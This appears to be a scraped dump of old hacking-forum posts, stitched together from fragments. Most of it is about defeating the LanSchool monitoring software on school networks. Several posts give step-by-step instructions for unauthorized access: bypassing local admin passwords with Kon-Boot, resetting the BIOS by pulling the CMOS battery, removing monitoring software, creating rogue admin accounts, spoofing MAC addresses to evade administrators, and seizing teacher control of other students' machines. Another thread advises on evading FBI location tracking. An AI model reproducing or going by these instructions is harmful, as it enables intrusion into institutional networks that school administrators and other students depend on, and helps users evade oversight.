was just seeing if it was at all possible to inject a packet from a certain command from the teacher viewer before I took a look at doing what you suggested.\n\nI did this because I figured it would be easier spotting the packet for that command before I sorted through all the shit trying to work out which one is displaying the students desktop. The other reason was I read that someone tried the same sort of tactic (injecting commands without teacher viewer) in the older version's and since then they claim to have corrected it.  \n\nSo jah just messing about learning WPE pro and via trail and error (to be honest I only have a rough idea what I am doing).\n\n\nget a Linux/UNIX based windows password wiper livecd\n\nInteresting, now you have caught my attention.... MMMM maybe I can have a word with my teacher and see if he will permit me in doing so. Thanks for that mate.\n\nRegistry Channel mod\n\nFirstly neither azza or myself created the below, we stumbled across it while browsing the interwebs (I don't wanna be stealing someone else's thunder).\n\nAnyways just copy and paste the quoted text into note pad and save as whatever file name with the .reg file extension. Then double click it and add to your VMware registry to be able to view all channels without having to install/uninstall to change.\n\n\nWindows Registry Editor Version

So far I have found the best way to kill it is to get your hands on the initial setup .exe and use the uninstall option (works 100%). The only draw back is once you logout of the schools domain it obviously will be back on your task bar.\n\nWell thus far I have only tried one port listener and blocker, by the reports in here TCPview maybe able to get the job done. I will eventually get around to seeing if this works and post my findings on here (thats if someone isn't kind enough to do it before me).\n", "\nJust one quick update for now, on Friday a class mate decided to BYO laptop with Lanschool teacher viewer installed, I can confirm 100% that you can utilize it without joining the domain (incognito much).\n", "\nInteresting find H@lo,\n\nSounds like Vision has some pluses over Lanschool.\n\nlol Cheeky bloody app switching  ports on you!\n\nBy the way what do you have in mind for the chat thingie?\n", "\nThat is a pretty neat work around Webjocky especially due to the overly protected desktop. Thanks for the share it was a interesting read.\n\nlol I wish you could still visit blocked sites via entering IP addresses. The only work around the guys have found thus far is using XB browser but by Christ is it slow.\n", "\nWell the VMware Idea was mentioned on the first page so that was nothing new, however your findings on killing LAN school are interesting. I tried to kill it with a few port listeners with no such luck, I still reckon the best way to remove LAN school is with the installer, way less piss farting around.\n\nAh I never thought that setting the chan to 0 would yeild you all class rooms, that was a nice find. I cant see why the hex reg on the previous page wouldn't work in a VM, I never had an issue with it and it worked a treat.\n\nYeap the Admins can track this down very easily, via a number of ways, TCP/IP address, MAC address, The Domain user account and the VLAN port you are on. To Combat this I would suggest loading lan school on a laptop  and jacking it into the schools network and spoofing your MAC address either via the device manager network card option (thats if it allows you to) or by using a nice lil app call sMAC. Note you do NOT have to be logged into the domain with your student user account to use the Teacher viewer. By eliminating the above three it only leave's you traceable via your VLAN port. I know for a fact that all our IT rooms are a part of 1 VLAN which means they have 10 class rooms to sort through. XD\n\nI concur the key logging function should not be utilized without written consent, then again I am not stupid enough to use the schools network for checking emails or other private data so its not so much of an issue for me.\n\nI am actually glad I stumbled onto this little find, one of my classes has been broken up and I have a new teacher doing the IBM iseries shit and he is a dead set NAZI with over abusing his LAN school powers. He always feels the need to mention that he is locking everyone's desktops and I just can't help myself and crack up laughing. The fucking prick told me off the other day for using my own laptop (no I wasn't do anything wrong, it wasn't even jacked into the network). I was told to turn it off because I wouldn't need it which I replied with don't ya mean because you can't control it? Its my laptop so fuck off ya twit!\n\nI also read a few of the previous posts that I neglected to reply to. If you are after ways around content filters DO NOT bother with proxy's, pinging a web address to get the ip for a url and so forth it simply does NOT work on the vast majority of educational institutions. You sure fire way around it is to set up a VPN server at home (Win XP pro will allow for one VPN client) which is a piece of piss to do, configure your router to port forward to your local private IP address that points to your VPN server. If you have a dynamically assigned ISP TCP/IP number you may also wanna sign up for a DynDNS.org account. Once thats all done just create the client connection on your schools computer and connect to your VPN server at home and enjoy encrypted secure traffic and no more filters.

Fucking hell 10mbps lan with that and all the other network traffic, must of been a bitch!\n\nHey Hyde do any of these student monitoring software on the marke actually provide any security? From the hand full I researched a while back they all seem to operate in much the same way LAN school does.\n\nYeah that is true Dingle but thankfully my school don't utilize the keylogging option.\n\nThat would be about right sparda, the teachers come to you guys requesting the software yet complain when it starts slowing down the network. *shakes head* Don't you just love dealing with the dumb end user sometimes.

Guess they did the smart thing and ran a test before implamentation and decided against it for whatever reason.\n\nMy I.T teachers were bragging about the software prior to the install over the holiday period as it turns out they really shot themselves in the foot and gave more power to the students.

Hence the VM bridging solution as a work around for installing the setup for LANschool teacher viewer software package and editing the .reg keys to be able to listen on all channels.\n\nAs for killing the process some of the process killers that just run via .exe and don't install work. I still stand by my previos statement that removing it with the LANschool installer is by far the easiest option. next tick check box next and BA BYE LANschool.

I will get around to doing it sometime this week and post.\n\nlol Oi what are the chances of getting snubs doing a demo on the Vmware work around and Lyzon's app in a future episode or is that wishful thinking XD\n\nP.S Thanks again to all who contribute on this and really ran with the inital posting, you guys are FREAKING awesome.\n", "\nEDIT\n\nGood luck on the port blocker venture I tried this already with a number off them in earlier posts and could't stop the bloody thing. I believe they mention that you can't do this on the website seeing as this was an issue with students working around it in previous versions.\n\nlol a hidden dialog to close students, thats a nice find indeed. Hey I wonder if it is at all possible to make something that listens and allows LANschool teacher to connect to it so you can do some funky stuff with the techers desktop or some shit.  I doubt this is possible, form what I remember about Lanschool when I put it to a sniffer the student constantly broadcasts and all the teacher does is listen in on that broadcast.  I will have to take a look and see if it is possible to get the teachers desktop IP number from this, if you can maybe you could add a port flooder of some kind or some standard annoying windows shit like net send or what have you.\n\nOn the other hand if you could be arsed you could turn that app in to every students swiss army knife for class  by adding shit like a packet sniffer, XB browser or what ever else tickels your fancy (just an idea). \n\nI would love to help working on this but unforunitly I specialize in netwroks not programming (however it is on the to learn list).\n", "\nLyzon I tried your app today and it wouldn't launch the .exe file, not that its your fault but more so the fact my school don't have the .net framwork installed. I suspect I may need a couple of .dll's to get it to load but as to which ones I have no idea.\n\nlol I feel your pain with packet logging its easier if you create a custom filter that gets rid of the ARP and other assorted rubbish so you are only looking at lanschool packets also you can can select a packet of interest and follow tcp/ip stream to get the ascii output (in case you didn't know), Anyways I maybe able to fudge my way through it and if not I will make it a class project out of it and see what me and the boys can come up over a lunch break or two for ya. Also it may pay to capture/upload the wireshark log's and the teacher program hack for posting on  here so anyone else interested can have a crack sifting through it.\n\nMMMM good question, I was pondering over this today and I couldn't think of what else would be helpful........ maybe synergy,  *shrugs*. In any case I am sure some of the hak5 higher ups and regulars will have some great suggestions. This could be a useful device for students to carry around on a thumb drive. XD\n\nYou thought of a name for it yet other than the crasher and teacher hack? If you go the student swiss army knife route may I suggest Lyzon's LAN tooled. Its a spin off from the older LAN school hack called LAN Schooled. Think of the slogan don't be a fucking tool use one Lyzon's you got LAN tooled =P\n\nEdit due to that once a year brain wave\n\nI have a cunning plan me lord! Now I can only speak from my own experience's but using a school network is a shit, how many times have you been working on an assignment and had your word document/computer crash or the stupid admins fire up their AV scans not after hours while you saving a word .doc and due to low resources your file gets corrupted/fucked (so far I am up to the 5th time in 3 months...... feel the rage!). Also you do a fair amount of google research during class and sometimes you neglect to copy and paste the url of some website that has really good info on something and when you get home to try and find it you can't.\n\nThe answer lies within, Lyzon's LAN tooled (I am calling it that for now, until you name it officially) with built in key logging feature to record assignments you are working on and visited websites.\n\nAnyways thats just an idea, not sure if other students have the same problem but if you ever lost work or a good website for referencing  you would WANT this feature. Only issue is this feature would be picked up by most AV's even though it has no malicious use intended (sucks).\n", "\nlol very true, but thats life for ya filled with those ironic momments. XD\n\nI am sure you would much rather trust a keylogger you scripted yourself opposed to the 2nd option.\n", "\nlol Well that is another issue all in its own, I guess the overly paranoid will pick your tool apart.\n\nI no longer need the keylogger option seeing as after the previous mentioned bullshit I came across on the schools network I cracked a shit fit and just purchased a new laptop that I can use. A few fellow class mates are considering doing the same But yeah for everyone else keylogging your work could come in handy.\n", "\nDue to a fair few PM's I figured I may share for educational purpose's. But seriously do any of you even watch hak5 if you did you would easily have your work around solution and wouldn't need to ask such questions.\n\nTBH I am yet to look at their recent build and have a fiddle at a work around solution for it. With that said I am assuming much is the same with the previous one and if you simply wish to remove it, its just a matter of having the right privileges on the local machine and the installer to remove it. CBF testing it with the latest build due to assignments and work commitments (the irony seeing as I am currently employeed in the IT department of a school). \n\nStep 1: Download Kon-Boot and burn it to a CD with roxio, nero, free iso burner etc or create a bootable usb key. Don't worry about the quick download its only a couple of KB's in size.\n\nStep 2:Log into your workstation as per normal  (into the domain) go to start run and type cmd. At the command prompt type net user and hit enter. You should see all the accounts that are on that local machine. In most case's the help desk department would image each machine with the same settings and the Adminstrator account is usually changed to another name such as Poweruser, superuser etc. Just take a note off all the accounts on a piece of paper\n\nStep 3: Restart your computer and boot the kon boot CD. Most schools wont stop you from booting off the cd but if they do and you need a password using the default loggin for your student ID (or workstation loggin prior to you having to change it when you first started school) works a treat seeing as they usually conform to a common password structure. Follow the prompts through kon-boot until you reach the login screen.\n\nNote: If you are unable to get the password to boot off the CD or change the bios just wait for your teacher to take a well deserved coffee break, unplug power, pop open case and remove the watch battery on the mother board for a few seconds to reset it.\n\nStep 4: select login into this computer (locally not into the domain) and enter one of the user names that you suspect is for the admin account and just hit enter, kon-boot will by bass the password for you.\n\nstep 5: Once in Use the lan school installer (you may wanna download that to a usb mem stick before hand) to remove the installed lanschool software from your workstation permanently. If for some reason the new version requires a password or something to remove it. Just fire up regedit and mess with/remove the registry entry for lanschool which will bork it up.\n\nNote: seeing as you already have admin on the box you may as well create a new admin account for yourself and set it up to your pleasing with your fav browser firefox, fox proxy to bypass the content/url filtering etc. Now when ever you wanna log in you just log into the local machine and not the domain. To get web browsing n stuff you will just have to load a web browser and you will be prompted for your login credetials for the domain/your active directory account. Just login how you usually do with your student ID/user name and password and the proxy settings and such will load into your browser so you can surf as normal. Only diff now is you are on a box without lan school and are free to install/unistall as you wish. This is how I do things at my school and I have about 4 machines for the different classes I attend customized to my liking.... not that I use it much these days seeing as I BYO laptop. XD\n\nIn any case as was mentioned on here before use your time to study and not spend it on social networking sites n such. I can assure you that most school networks are pretty insecure and MITM attacks on them are pretty much a peace of piss to pull off seeing as students are usually clumped together on one VLAN.\n", "\n\n\nI lol'd hard.\n\nLooks like you guys did way more research into lan school than I could in my current state.

Anyways I did the topology shit with no issue and used the auto cabling option due to being lazy, I set my addressing and enabled a bunch of services on the three servers.

I was like WTF? You only need a routing protocol if x2 or more routers are being used (which was debated heavily by myself and other students).

Generally speaking Router connected via ethernet to access point. then your laptop associates to the wireless AP and the router does its thing. \n\nThe only part you may cock up and run into problems is assigning IP numbers and the possibility of having your AP and Router set to defaults and both are utilizing DHCP. If you want to have IP addressing assigned for you, Disable DHCP in the router and leave it on the access point. If you are anal like me and like to know the IP of your computer just give each device and comp one manually in windows or if your AP permits reserve a IP address via MAC address .\n\nProtip set IP addresses to router and access Point yourself, you will need to have these at a unchangeable address for future networking needs. \n\nRule of thumb First 2 numbers for networking device's rest for computers. \n\nEXAMPLE:\n\n192.168.0.1 Router, 192.168.0.2 AP, 192.168.0.3 laptop and so on for other comps.\n\nsubnet mask 255.255.255.0, Default gate way and DNS set to where ever your internet comes from (if its a router/modem it will be 192.168.0.1) \n\nAs for encryption WEP = was easily penetrated (can be cracked in 10 minutes) use WPA or preferably WPA2.

This line of posting goes the same way EVERY single time.\n\nYou have two groups of people:\n\nGroup 1.\n\nUses analogies like reading lamps shining onto their property, someone else's lawn sprinkler watering their grass, watching the neighbors tv through a window, and sometimes even borrowing the neighbor's paper and returning it before they wake up. Listening to a radio.\n\nGroup 2.\n\nAccessing any network without express permission, not implied permission,  from the owner is illegal\n\nNow group 1 uses all of these flawed analogies to try and justify why their actions are legal. They incorrectly assume that an unencrypted wireless signal is equal to express permission from the owner to use. A hotspot that is provided by a business to its customers is different then an unencrypted access point in your neighbor's house. It does not matter if the signal can be accessed from you house. They are radio waves, radio waves propogate !\n\nGroup 1 people like to use the idea that since there is no physical connection then a crime cannot be committed. This is false. A network, which you do not own is being accessed without permission. The owner of that network, pays for a service, you are using a service without paying, that's stealing. They only use it check email or only use it for a couple minutes.\n\nIt alls comes down to whether you have permission to use the network. Granted some people will leave their access point unencrypted so that other's can use it. But, you can't assume that EVERYONE who does this, does so knowingly and for the same purpose.\n\nYou can't say that Windows automatically connects to unencrypted networks. It doesn't. It requires the user to first \"ok\" the connection.\n\nYou can't say it's the job of the manufacturer to blah, blah, blah. They do, every Access point is capable of even the most rudimentary encryption algorithm.  It's all explained in the manual that comes with the Access Point. Whether the owner chooses to use it or not is up to them. \n\nWifi finders listen for broadcast beacons from access points. In that beacon is information about said access point. Some higher end models will visually show you things like SSID and whether or not the encryption flag is set. Others will just light up a series of lights. In no way can I see how this information can used be considered permission to access the network connected to that access point. The wifi finders don't, they just pass along information from the Access Point broadcast to you.\n\nIt all comes down to Group 1 people trying to find a way to justify their action by using comparative methods that don't explain the same thing. And Group 2 people will always be right as every single state in the U.S. as well as most countries have a computer law that can be summed up in \"if you connect to a network that you do not have express permission to connect to, you are committing a crime\" It does not matter if you connect via a wire, a radio, infrared or tin cans on a string.

When the restore image is applied the drive partition is deleted prior to reimaging (would this not remove a rootkit?)\n\nI am also not so sure that software would make it on a system without some sort of actions by the user allowing it to install.

Success we managed to load it up and we could view all other machines in the room.\n\nThe second way we found which is alot more easier was using a tool called apt (Advanced Process Termination) this tool gives you multiple ways to kill/crash a process we loaded this up but it did not find lanschool student because it was hidden so we had to use process explorer to find the PID and add it as a custom process we then tried all the method to kill the process but they all said they failed but when we looked at the icon in the tray it dissapeared we tried all of the way seperatly and figured kill 3 was the only that was doing it this was:\n\nAttempts to terminate the process by sending Close messages (called WM_QUIT) to all windows in the target process. This method only works if 1) the target process has at least one window, and 2) the target process doesn't handle the WM_QUIT message (many programs don't).\n\nand this was the best way we found.\n\nAnother problem we encountered was that we could not change the channel, we tried using the script posted earlier but it did not work since we could not see the machines in virtual pc and we could not edit the registry on the main pc because it was disabled. So we found a hex editor to edit the teacher program to change the channel this worked but it was alot of effort to change it every time we wanted a different channel. So then we got a hold of a program called cheat engine which changes values in process's we did a scan in lanschool teacher for the channel we was on and it found a lot of address's so then we hex edited the channel to something different and started that up then did another search and found less address's we went through the static address's and then found the one that changed the channel and added that into a trainer to make it alot easier, we also figured that if you change it to channel 0 you can see every single channel.\n\nI dont want to give link to any of the files  we found/created for it since we dont want anyone doing it you should be at least clever enough to follow these exploits\n\nOne more thing this program moniters all the keystrokes you type why it is running, we found this to be really bad since there was no agreement we signed/saw that authorised this so if you also have this running on the computer and it has no been authorised that they are allowed to moniter anything you type you should have the right to turn it off, or take it up with whoever looks after the network.\n\nThanks to the people who posted in this thread it helped me out a bit and hope I have helped out anyone =)\n"], "ben\u00a0\u00a0": ["\n\nI wouldn't say that Digg can teach anyone anything about hacking.

You know what book it is and your buddy knows what book it is. Each line of the book gets read and used as a salt while hashing each word up to certain length maybe 7 characters bigger words concatenated. So only you and your buddy have the dictionary to create the precomputed lookup cards for messages. Then you create an encrypted container to put the message in put that into another encrypted container and so on for like 500 layers of encryption block cipher send through stream to buddy.\nSo an attacker would have to know what book what pages you are using for salts. Then they would have to know the hashing algorithm then would have to know which encryptions you are using. Then they would need a LOT of compute power to get the plaintext. The hashing portion of this could be figured out like a very complex cryptogram so you alternate hashing and encryption schemes to make it less susceptible to attacks. Nothing is really secure though.\nWhatever type of encryption is less relevant.

While google can trace wifi signals on phones accurately, to my knowledge 3G runs on completely different frequencies with different properties.

While it still would be possible to triangulate the signal to get physical location, wikipedia says that is only accurate up to 50 meters in urban settings and even more inaccurate in rural settings. http://en.wikipedia.org/wiki/Mobile_phone_tracking\n\"Advanced systems determine the sector in which the mobile phone resides and roughly estimate also the distance to the base station. Further approximation can be done by interpolating signals between adjacent antenna towers. Qualified services may achieve a precision of down to 50 meters in urban areas where mobile traffic and density of antenna towers (base stations) is sufficiently high. Rural and desolate areas may see miles between base stations and therefore determine locations less precisely.\"\nI also noticed in the affidavits I've read that the people the FBI are catching, they aren't using 3G. \nI'm not very knowledgeable on this topic so take what I say with a grain of salt, but I've heard through the grapevine that this type of technology is pretty advanced and only used in the upper echelons of federal agencies and the military, IE, you'd have to do something really really bad for them to come after you with this technology. And even if they do, just take the SIM card out of the 3g modem when you're not using it and there is nothing to trace.\n", "\ndigi - I understand what you're saying but it appears that the vast majority of your argument is based on speculation. 3G is not GPS. At least publicly, there is no central 3g tracking center designed to give coordinates on all 3G users. \nThe goal of using 3G is to limit the probability of someone finding your PHYSICAL location As you mentioned, if I were interested in hiding traffic or preventing traffic from being sniffed, all I would need is to connect to a VPN via 3G.\nYou are incorrect about \"them\" being able to track your movements. Assuming wikipedia provides correct info, in a best case scenario they'll only get up to 50 meters accuracy of the location of the modem. \n\nAs opposed to hacking over a landline?\nThey could contact the phone company who's service you connect over, and shut you down leaving the 3G device disabled to the itnernet, but still track it, or just intercept your traffic and sniff everything you do on the 3G connection. \nAnd they can't do this on landlines? It's actually much easier for them to do this on landlines, no?\nThink about what you are saying, regardless of triangulation, you are using the cell companies towers, which they can track which towers you are near and have connected to, and law enforcement can get a warrant to sniff your connection\nOnce again, it would be easier for LE to do this if you were using a landline... and once again, the goal is not hiding data, it's hiding a physical location. \nI have a question, are you aware of any cases where someone's physical location was tracked down from using 3g? I am not. I am aware of MANY recent cases where physical locations were determined, even though the target was using wifi + VPN/TOR. If FBI affadavits tell us nothing else, they tell us they have the technology to determine the physical location of someone using TOR/VPN who is connecting from a landline. Not saying 3G is a sure shot way to hide your identity, but it seems LE isn't quite there yet.\n", "\nI read about the mall using phones to track customers. They setup a lot of antennas with the confines of the mall, normal urban and rural areas do not have coverage like that mall experiment did. In theory, for someone to track 3g movements, they'd have to track it first from the telco's towers, then setup a bunch of their own antennas in that 50 meter area to further track it. In my apt building there are 6 - 12 apts in any given 50 meter area. \nYou could always get several SIM's or different modems and interchange them for further anonymity and obviously you keep it off when you're not using it.   \nThere have been plenty of cases where the FBI has gotten people for using stolen wifi. Also where I am, WEP is rare and you wouldn't be able to depend upon being able to crack wifi wherever u go.

It works on SSDs as the firmware will erase the all the memory locations on the device in one go (fast!), it will work on hard disks with just two passes and it even physically offsets the heads on both passes to overwrite the edges of the tracks (Just in-case your attacker has an electron microscope to view the platters with).\n", "\n\nLaws are also country dependant, which makes it impossible to give a yes or no answer to \"is this legal\" type of questions.

You still have to patch things up, like update your software once a month.\n\nAs far as the computer security itself is concerned, its looks secure to me.\n\nAnother thing you could look at securing would be at the network level. You can build your own firewall box with PSFense/Untangle or buy a hardware based firewall. Most firewalls will do packet inspection which is not enough for securing a network, you want a more effective way for blocking attacks like IPDS.\n", "\n\n\nI don't seem to have this problem, my computers always have a good boot up time.

It could be infected without you even realizing.\n\nAnd computer viruses nowadays are getting very smart, lying dormant while its causing some sort of damage to the system, without any user consent. Plus it could be incorporated with some kind of nasty rootkit, to make it even impossible to be detected.\n\nI don't know, give me good reasons to believe your system is not infected.\n", "\n\n\nsome rootkit can actually write themselves to the actual hardware, so even if you format your hard drive it will still reinfect the system.\n\nthere are virus like boot sector virus that can hide themselves in the boot sector of a hard drive and even with a complete reformat of the hard drive, it could still infect the system, unless you wipe the master boot record, that should completely wipe the fucker off.\n", "\n\n\nSorry I meant the hard drive, but some hardware has a built in ROM in it, so if the root kit is engineered to write itself to that particular ROM than you are doomed.\n\nNow as you mentioned above, performing a low level format should wipe the virus off.\n", "\n\n\nWhy is that? Comodo is pretty easy and secure to use. I don't know about ThreatFire but it looks promising.\n", "\n\n\nGood to know, so there seems to be a compatibility issue between the two.

Ensure all software, including the OS is fully patched up\n\n2. To mitigate zero days attack, a good firewall (I recommend Comodo) should be installed, with rules set to only allow certain traffic to access the internet and to deny any incoming request, that hasn't been made.\n\n3. I would recommend using Avast 5, as your AV engine. Its free and it will 99.0% of all times protect your computer, there is no user interaction required for updating it it all happens automatically on the background.\n\n4. If you are still using XP, do not use LMLam to manage your logon passwords, upgrade it to NTLM and make sure you use a complex password or use another means for user authentication that doesn't rely on windows itself. \n\n5. For spyware detection, I use spybot - Search and Destroy and spyware blaster.\n\n6. A VM could also be used for isolating viruses infections when browsing the internet.\n\n7. For a more effective protection a firewall with IDPS functionality could be implemented at the Network perimeter to prevent threats from entering the network.\n\n8. Upgrade any firmware you have on your router or switch and always remember to never click on files or links you are not 100% sure where they come from.\n", "\n\n\nDarren did a segment back then on Untangle and to be honest, I kinda liked it a lot, and seems to provide a lot more features than any other linux based firewalls.\n", "\n\n\nWith today's threats an IDS firewall is not enough, IPS must also be implemented to strength the security and integrity of the network.\n\nComodo Internet Security Complete, is an all in one security software package that comes with host intrusion prevention and many other more security features, that is a must to have.\n", "\n\n\nI use Avast at home and never had any issues with, its very effective at blocking and detecting malwares.

(software, OS, antivirus)\n2) Don't surf unsafe websites, and don't open attachments coming from unknown/untrusted sources.\n3) Let be honest, Windows 7 is by far one of the best OS Microsoft has ever designed to date. Windows 7 is NOT the perfect OS but it's much more secure than its predecessors and if you are still using XP, do yourself a favor ditch it, and install Windows 7.\n4) DO NOT log in as administrator, log in using a non-privileged account or an account with limited access to system resources.\n5) Install and maintain your antivirus up to date.\n6) I would limit the installation of any third party software, to reduce the chances of exploits or virus infections. Instead use a VM and create a snapshot of it and always revert back when finished using it.\n7) Maintain a good password policy, change it once a month if you can and use a password manager such as KeePass to keep it secure and locked away.\n8) Use complex and log passwords and DO NOT disclose them to anyone, as well as DO NOT use the same password for every account or website you use.\n9) When logging into Banking websites, use Avast SafeZone, to isolate your web browser from the system itself. Very handy, if your system is infected with a Keylogger or Trojan keylogger\n10) Install a network IPS and IDS\n11) Do not respond to emails, that asks for personal information updating. Get rid of it and block the sender.\n12) Install Device lock, to prevent casual users from stealing your information, when away from your computer.\n13) Encrypt your entire hard drive with TrueCrypt, and make use of Hidden containers.\n", "\n\nDNS servers have always been vulnerable and very difficult to protect against spoofing attacks, but now there is a solution for it, DNSSEC.

Here is the link for those videos, http://www.securitytube.net/groups?operation=view&groupId=9 just go through each one of the them carefully watching and paying attention to what he is saying.\nTo be honest, I learned quite a lot just by watching videos and researching on my own.\n", "\n\nYou are on the right track, just keep on practising and watching those videos.\n", "\n\nHey bro, can I recommend you to buy a wireless card from Alfa Networks, you won't have much problems.\nOr better yet, go to the Hak5 shop and buy one from there.\n", "\nWhilst experimenting these techniques are good for learning purposes, I would not encourage doing that on a network other than yours. If you really want to get into the realm of pen-testing, I would suggest practicing on your own or at least seeking approval.\nBesides poking around on other people's network without their consent and permission, is just asking for trouble and I say this from my own experience too. I used to be just like you, curious and always exploring new things until one day at my high school, I got caught and warned for what I was doing.\nAnyway, they gave a warning and advised me not to do again, or else I would face expulsion.\n", "\n\nThe reason is very simple, you already know what the ins and outs of your school network are, you also know where the weakness are. You've tried to warn them about these security issues, but they have been negligent you take the matter into your own hands and decide to do a bit of poking around on the network only find that you managed to break into your schools principal computer.\nNow they find out it was you who did it, and they give you a warning stating that you shall not attempt to do any illegal activity ever again or face expulsion. Months passes and nothing has been done about the security breach, they haven't even patched the security hole.\nNow from this we can learn that, if you were a bad student and got expelled from school you could from outside hack into the schools system and still break into the principals computer.\nMoreover that's what they mean by this, there could be other reasons too but that's the only reason I can think for the moment.\n", "\n\nI know exactly what you mean and whether you know what you are doing or not. Its what fear them the most. School's network administrators are very protective of their network, it takes them a very a long time to get whole system set up and running. And to have someone snooping or exploring their network is what makes them concerned. You may not have intention of breaking or causing harm but sometimes, the temptation can overwhelm us.\nBack in high school, i wasn't the only one but I had a college who broke into the server several times and that had the IT admin, the teachers and the school's principal extremely worried, as result they gave him a warning and booted him off the system for several months. He was also warned not to come in contact with any of the schools computers or face expulsion.\n", "\n\nI agree with you and every school IT administrator should be doing that, but it always comes down to the resources they have (time, money, experience and the list goes).\n", "\n\nApparently that's how things in IT can work sometimes, bad things have to happen, for someone to notice and take action. For instance, Sony was only concerned with making money and obviously not concerned with the security of their network in general. Moreover, someone from the outside had to teach them a lesson about security and that's what happened.\nThey lost millions of dollars, their reputation was put on the line and their clients might have lost their trust in them. Moral of the story, I think any person in charge of an IT system should have some experience with network security.\n", "\n\nAnother reason not to hack into the network, if you get expelled or you will go to jail.\n", "\n\nA couple of things you could do, is get certified plus get some experience and then talk to your IT manager about becoming his assistant.\n", "\nIf you are so eager in learning how to hack, can I suggest you to set up some VMs and use them as a foundation for your learning.\nThere are a couple of great tools you could use to make the learning more exciting, Backtrack and Metasploit. I would recommend to use Metasploit as a starting point and then move onto Backtrack, as you advance and gain more knowledge but you can try either tool and get a bit of a feel for both.\nTo learn how to use them, there are great websites with plenty of information, \nSecuritytube.net\nMetageek.com\nhttp://www.backtrack-linux.org/tutorials/\nhttp://www.offensive-security.com/metasploit-unleashed/Metasploit_Unleashed_Information_Security_Training.\nhttp://www.hak5.org\n", "\nBreak into someones computer/system and steal all their banking details and then make a large money transfer to somewhere overseas.

Depending on what the damage is, how long others had to go without internet, then the ISP may decide to track you down. \n\nSeeing as they only used 60 or so bots to attack this site then it probally did not do any harm. Also you are causing a local dos on the bot computer because you are using there resources to do the attack, but you already covered that.\n\nI dont want to argue about it, the  Police And Justice Act 2006 says that if you do this with just the \"the requisite intent\" or \"the requisite knowledge\" of impairing the operation of a computer, prevent/hinder access to any program or data held on a computer or to impair and operation on a computer then you can be punished by 2 years in prison. I cant help but think of it all the way from the bot to the isp to the target, all of the systems are being impaired but that is just how I look at it.\n\nI do not live in the UK so I am just going off of what Ive read and what people have told me.\n", "\nReading over the Computer Misuse Act 1990, not sure if that's the newest version there are a few things that although may seem morally right are against the law. Here is the url I am using:\n\nhttp://www.opsi.gov.uk/acts/acts1990/UKpga_19900018_en_1.htm\n\n\n\n\nTo fulling understand that you have to also read article 4. You would have to prove that BBC had the intent \"to impair the operation of any computer\" it doesn't seem like they did that. Although they changed the wall paper that did not impair any operation of the computer, using the resources, bandwith/cpu/ect, may have though. Article 6 of section 3 is also interesting;\n\n\n(6) For the purposes of the [1971 c. 48.] Criminal Damage Act 1971 a modification of the contents of a computer shall not be regarded as damaging any computer or computer storage medium unless its effect on that computer or computer storage medium impairs its physical condition. \nThis article seems to back up the claim that modifying the wallpaper is not a criminal act. I thought I read somewhere that they did remove the bot from the computer. If this was a mission critical system, life support/power plants/ect, and removing the bot had some ill effect on the computer, it was hooked into the kernel, and it was unable to boot then it may be a criminal offence. \n\nArticle 17 deals with interpretation of this bill, don't know what they call it in the UK. Section 7 article 2 says that if the \"program\" out puts any data whether by having it displayed or in any other manner is illegal. Droping down to article 4, For the purposes of subsection (2)(d), describes what exactly is meant by this;\n\n\n(B) the form in which any such instructions or any other data is output (and in particular whether or not it represents a form in which, in the case of instructions, they are capable of being executed or, in the case of data, it is capable of being processed by a computer) is immaterial.\n\nNow I get back into the wall paper subject. Article 7 says \"A modification of the contents of any computer takes place if[sic]\" subsection b, \"any program or data held in the computer concerned is altered or erased\". How do we know that this is illegal? Article 8\n\n\n(8) Such a modification is unauthorised if\u2014\n(a) the person whose act causes it is not himself entitled to determine whether the modification should be made; and\n\n(B) he does not have consent to the modification from any person who is so entitled.\n\n\nIt would seem that what they did was illegal. I cannot find more information about ddos laws in the UK but from what this says all of what they did was illegal... using resources, changing wall papers, sanitisation of the zombie. Its up to the court to decide really, this is a hard bill to understand.\n", "\nBBC has some great lawyers and they more then know the law, but Section 7 of the Computer Misuse Act 1990 is about territorial scope. In subsection sub subsection 1B it says that the law still applies if they are a party in England or Wales and it describes how. It says that they may become a party via an agent, what type of agent is made clear but to me I think of the agent here being the internet and alas herein lays the problem. With that logic it can be said that if I exploited a computer in the UK I fall under this law, extradition is possible but it is more likely I will be heard in a US court. The act itself took place in the UK, the zombies may not have been in that area but the law \"should\" still apply. I think at the bare minimum this should be heard in court so that there will be some type of precedent to base future conclusion off of.\n", "\n\n\nYou normally do not buy a botnet.

I also have the school wifi password so thats how I connect to their SMB share with my phone. Anyway, over a year ago, I was looking through the Administrators files and I found the LanSchool Utilities folder and it contained Windows executables that communicate with LanSchool. One of them was \"\" and this obviously switches you to a teacher. But, when the Administrator installs LanSchool, he selects install Student so there for, C:\\Program Files\\LanSchool\\Teacher.exe does not exist. So since I have the full LanSchool 7.0.0.7 installation program as well (I don't have 7.2 :-/) I copied the Teacher.exe from my computer to my desktop folder. Then, I created a batch script that would execute SwitchToTeacher.exe then execute Teacher.exe. This way, you are now a Teacher. I had control over all the students in the class. Lol. And if you go on options then Network and select Multiple channels, you can have control of all the computers with LanSchool installed by entering all the channel numbers (1,2,3,4,5,6 etc).

I figure it's being implemented in other classes and probably in the library as well so I'll probably have some fun messing with the other students (if I can find a way to connect to them).

Hubs are \"dumb\" and do not use logic. Switches do use logic! When a new client first sends one frame over the wire, the switch reads the header and then forwards it to its destination if known, otherwise it drops the frame. The client must retransmit, but this only happens once for a new client. The switch notes the MAC and the physical port it came in from on that first frame. It stores this information in its CAM table.

IVs are sent with the encrypted message in the plain-text, because it is secure to do so as they can't gain any information from the IV and the IV is required to decrypt the content.\n", "\n\n\nThe work that has gone into studying the algorithm is like studying the surface of the earth for Black Swans, two or three times, if there was a \"backdoor\" then it would have been found by now and would have been found very quickly.\n\n\nHow are rainbow-tables going to help \"crack\" AES ?\nThe reason they work so well on windows-pw's is the fact that\n\nthe geniuses in redmont \"decided\" to store the unsalted hash of your windoze-pw on disk .\n\n(They also \"decided\" to use a weak RNG btw.. making it a pretty obvious backdoor IMO )\n\nThat is not the case with properly implemented AES (or any other well-reputable cipher for that matter) .\n\nIf you take the well-known crypto-program TrueCrypt it salts your pw with SHA 512\n\nand it does that at least 2000 times.. Even if you computed all the permutations in a huge rainbow-table\n\nyou would STILL have to brute-force the key (potentially try every possible combination) because there is nothing to look-up..\n\nSorry but I'm just to lazy to do the math for you,suffice it to say that just the power-requirements to complete the task are astronomical, \n\nwe are talking GIGAWATTS ..\n\n\nNo one hashes things 2000 times, no one hashes anything twice, the definition of a good hash is a one way function, so after one hash you can't go back, doing it 2000 times isn't going to improve security and is just going to waste resources.\n\nRainbow tables don't work again encrypted data because the key isn't stored anywhere hashed or not 